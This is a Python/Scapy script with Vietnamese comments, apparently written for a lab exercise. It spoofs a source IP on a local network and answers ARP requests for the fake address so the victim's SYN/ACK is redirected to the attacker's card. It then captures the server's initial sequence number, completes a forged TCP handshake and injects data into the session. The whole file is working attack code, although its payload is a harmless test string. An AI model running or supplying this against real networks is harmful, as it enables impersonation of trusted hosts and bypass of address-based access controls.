#!/usr/bin/env python3
# spoof_sniff.py - Gia mao IP nguon va hoan tat bat tay TCP 3 buoc tren Wi-Fi/LAN
import sys
import time
import threading
from scapy.all import *

victim = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.2"

# Neu nguoi dung truyen IP gia mao, dung IP do; neu khong, tu dong tao IP hop ly
if len(sys.argv) > 2:
    spoof = sys.argv[2]
else:
    if victim.startswith("192.168."):
        # Lay 3 octet dau ghep voi .222 (IP ao trong mang)
        prefix = ".".join(victim.split(".")[:3])
        spoof = f"{prefix}.222"
    else:
        spoof = "10.0.0.77"

iface = sys.argv[3] if len(sys.argv) > 3 else (conf.iface or "wlan0")
dport = int(sys.argv[4]) if len(sys.argv) > 4 else 9000
sport = 12345

print("==================================================================")
print("[*] GIA MAO IP NGUON (ON-PATH BLIND SPOOFING) HOAN TAT BAT TAY TCP")
print("==================================================================")
print(f"[*] May chu nan nhan (Victim): {victim}:{dport}")
print(f"[*] Dia chi IP gia mao:       {spoof}")
print(f"[*] Card mang su dung:        {iface}")
print("==================================================================")

# Luong tu dong tra loi ARP cho IP gia mao tren mang Wi-Fi/LAN
# Ly do: Khi Victim nhan goi SYN tu IP gia, Victim se hoi ARP 'Ai co IP gia nay?'
# Attacker se tra loi ngay: 'La toi!', giup Victim gui SYN/ACK toi dung card cua Attacker!
stop_arp = threading.Event()
my_mac = get_if_hwaddr(iface)

def arp_responder():
    def arp_reply(pkt):
        if pkt.haslayer(ARP) and pkt[ARP].op == 1 and pkt[ARP].pdst == spoof:
            rep = ARP(op=2, hwsrc=my_mac, psrc=spoof, hwdst=pkt[ARP].hwsrc, pdst=pkt[ARP].psrc)
            sendp(Ether(dst=pkt[Ether].src, src=my_mac)/rep, iface=iface, verbose=0)
    sniff(iface=iface, filter=f"arp and arp dst {spoof}", prn=arp_reply, stop_filter=lambda x: stop_arp.is_set())

arp_thread = threading.Thread(target=arp_responder, daemon=True)
arp_thread.start()

print(f"[*] Buoc 1: Bat may lang nghe (sniff) tren card {iface}...")
sniffer = AsyncSniffer(iface=iface, timeout=5, count=1,
                       lfilter=lambda p: p.haslayer(TCP) and p[TCP].dport == sport
                       and (p[TCP].flags & 0x12) == 0x12)
sniffer.start()
time.sleep(0.3)

print(f"[*] Buoc 2: Gui goi SYN tu IP gia mao ({spoof}) den Server ({victim}:{dport})...")
send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="S", seq=1000), iface=iface, verbose=0)

sniffer.join()
sa = sniffer.results
stop_arp.set()

if not sa:
    print("\n[-] Loi: Khong bat duoc goi SYN/ACK tu server!")
    print(f"    -> Hay kiem tra xem ben may Victim ({victim}) da chay: python3 server_h2.py chua?")
    sys.exit(1)

isn = sa[0][TCP].seq
print(f"\n[+] Bat duoc SYN/ACK thanh cong! ISN thuc te cua server = {hex(isn)} ({isn})")

print(f"[*] Buoc 3: Gui goi ACK gia mao voi ack_number = ISN + 1 ({isn + 1}) de hoan tat bat tay...")
send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="A",
     seq=1001, ack=isn + 1), iface=iface, verbose=0)

print(f"[*] Buoc 4: Gui goi tin mang du lieu doc hai vao phien TCP...")
payload = f"hello-from-spoofed-source-{spoof}\n".encode()
send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="PA",
     seq=1001, ack=isn + 1)/payload, iface=iface, verbose=0)

print(f"\n[+] DA HOAN TAT! Du lieu da duoc gui thanh cong tu IP gia mao {spoof} toi Server.")
